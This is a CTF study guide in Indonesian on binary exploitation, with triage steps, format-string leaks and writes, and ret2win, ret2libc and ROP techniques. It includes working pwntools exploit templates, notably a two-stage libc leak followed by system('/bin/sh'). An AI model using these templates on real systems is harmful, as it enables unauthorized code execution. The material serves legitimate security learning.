# PWN — Binary Exploitation ⭐

> Area prioritas. Disusun dari dasar → lanjut. Tiap teknik: *kapan dipakai → caranya → template*.

## Triage (lakuin tiap soal)
```bash
file ./chall              # arsitektur, statis/dinamis, stripped?
checksec --file=./chall   # proteksi: lihat tabel bawah
strings ./chall | less    # bocoran: /bin/sh, flag, format string
./chall                   # jalanin, liat input apa yang diminta
```

### Baca checksec → pilih teknik
| Proteksi | ON artinya | Lawannya |
|----------|-----------|----------|
| **NX** | stack gak executable | ret2libc / ROP (bukan shellcode) |
| **Canary** | ada stack guard | leak canary dulu (fmtstr/partial), baru overflow |
| **PIE** | base alamat acak | leak alamat biner dulu |
| **RELRO** (Full) | GOT read-only | gak bisa GOT overwrite → cari teknik lain |
| **RELRO** (Partial/No) | GOT writable | **GOT overwrite** bisa |

---

## 1. Cari offset ke RIP
Berapa byte sampai nimpa return address.
```bash
# bikin pola
python3 -c "from pwn import *; print(cyclic(200).decode())"
# crash di gdb, ambil nilai RSP/pola, lalu:
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"   # -> offset
```
Rumus klasik: `offset = buffer_size + 8 (saved RBP)` → lalu byte berikutnya = RIP.

---

## 2. ret2win (ctrl-hijack dasar)
**Kapan:** ada fungsi "win/flag" yang gak kepanggil. Tinggal overflow → set RIP ke alamatnya.
```python
from pwn import *
e = ELF('./chall')
p = process('./chall')            # atau remote('host', port)
payload  = b'A'*offset
payload += p64(e.sym['win'])      # alamat fungsi win
# kalau butuh alignment (crash di movaps): sisipin p64(ret_gadget) dulu
p.sendline(payload); p.interactive()
```
**Gotcha:** segfault di `movaps` → stack gak 16-byte aligned → tambah 1 gadget `ret` sebelum alamat tujuan.

---

## 3. Format String ⭐ (gap utama)
**Gejala:** `printf(user_input)` tanpa format string → kamu kendaliin format.

### 3a. Leak (bocorin stack/libc/canary)
```python
p.sendline(b'%p ' * 20)           # bocorin 20 slot stack
p.sendline(b'%7$p')               # slot ke-7 langsung (hitung offset dulu)
```
Cari offset input kamu: kirim `AAAA %p %p %p %p...` → cari `0x41414141` di slot ke berapa.
- Leak **canary**: biasanya nilai 8-byte diakhiri `00`, posisi di atas buffer.
- Leak **libc**: bocorin alamat fungsi libc di stack → `libc_base = leak - libc.sym['fn']`.

### 3b. Arbitrary write (`%n`)
`%n` nulis jumlah byte yang udah dicetak ke alamat yang ditunjuk.
```python
from pwn import *
# cara gampang: pwntools generate otomatis
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```
Manual: `%<angka>c` cetak sejumlah char → `%<pos>$n` tulis ke alamat di slot `pos`.
Gunakan `%hn` (2 byte) / `%hhn` (1 byte) biar gak perlu cetak milyaran char.

**Target write favorit:** GOT entry (mis. `printf@got` → `system`), return address, atau `__malloc_hook`.

---

## 4. ret2libc / bypass NX ⭐
**Kapan:** NX on, gak ada fungsi win, tapi ada overflow. Tujuan: panggil `system("/bin/sh")` dari libc.

### Langkah (2 tahap: leak → exploit)
```python
from pwn import *
e = ELF('./chall'); libc = ELF('./libc.so.6')
p = process('./chall')
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# TAHAP 1: leak alamat libc (puts(puts@got)) lalu balik ke main
payload  = b'A'*offset
payload += p64(pop_rdi) + p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.sym['main'])
p.sendlineafter(b'prompt', payload)
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']          # hitung base
log.info(f'libc base: {hex(libc.address)}')

# TAHAP 2: panggil system("/bin/sh")
payload  = b'A'*offset
payload += p64(ret)                              # alignment
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'prompt', payload)
p.interactive()
```
**Dapet libc yang bener:** dari offset leak → libc-database `./find puts <last3digits>` atau https://libc.rip.
**Shortcut:** `one_gadget ./libc.so.6` → alamat yang langsung execve("/bin/sh") (cek constraint-nya).

---

## 5. ROP chain lanjut
- **pop rdi/rsi/rdx**: isi argumen (x86-64 calling convention: rdi, rsi, rdx, rcx, r8, r9).
- **ret2csu**: kalau gadget terbatas, pakai `__libc_csu_init` buat kontrol rdi/rsi/rdx.
- **ROPgadget:** `ROPgadget --binary ./chall | grep 'pop rdi'`
- **GOT overwrite** (RELRO partial): tulis alamat `system` ke `printf@got`, lalu panggil `printf("/bin/sh")`.
- **ret2dlresolve**: kalau gak ada leak sama sekali & statis.

---

## 6. Bypass Canary & PIE
- **Canary:** leak dulu (fmtstr / overflow 1 byte buat bocorin via print) → sisipin nilai canary di payload tepat sebelum saved RBP.
- **PIE:** leak alamat kode dulu (fmtstr / bocor) → `e.address = leak - offset_fungsi`. Baru semua `e.sym[...]` valid.
- Urutan umum soal 400-500 poin: **leak canary + leak PIE/libc → ROP**. Gabungan ketiga ini yang bikin mahal.

---

## 7. Integer bug (int overflow / signedness)
Kayak soal `int` kemarin: input bikin nilai wrap (INT_MAX+1 → negatif, atau unsigned vs signed).
- Cek batas: `INT_MAX=2147483647`, `LONG_MAX=9223372036854775807`.
- Negatif size → `malloc`/`read` jadi gede (heap overflow) atau lolos cek `< limit`.

---

## pwntools cheatsheet
```python
from pwn import *
context.binary = './chall'                 # auto set arch/bits/endian
context.log_level = 'debug'                # liat byte yang dikirim/diterima
p = remote('host', 1337)                   # atau process('./chall'), gdb.debug('./chall','b main')
p.recvuntil(b'xx'); p.recvline(); p.recvn(8)
p.send(b'..'); p.sendline(b'..'); p.sendafter(b'xx', b'..'); p.sendlineafter(b'xx', b'..')
u64(data.ljust(8,b'\x00')); p64(0xdeadbeef); flat(b'A'*40, p64(addr))
p.interactive()
```
Debug cepat: `gdb.attach(p, 'b *main+123')` atau `gdb.debug('./chall', 'b main\nc')`.

## Checklist kalau stuck
- [ ] Udah `checksec`? Proteksi mana yang harus dilawan?
- [ ] Offset ke RIP udah bener? (cyclic)
- [ ] Alignment movaps? (tambah `ret`)
- [ ] libc versi bener? (leak → libc.rip)
- [ ] Ada fmtstr buat leak canary/PIE?
- [ ] Coba `one_gadget`.
- [ ] Baca ulang disassembly fungsi — ada cek/konstanta tersembunyi?
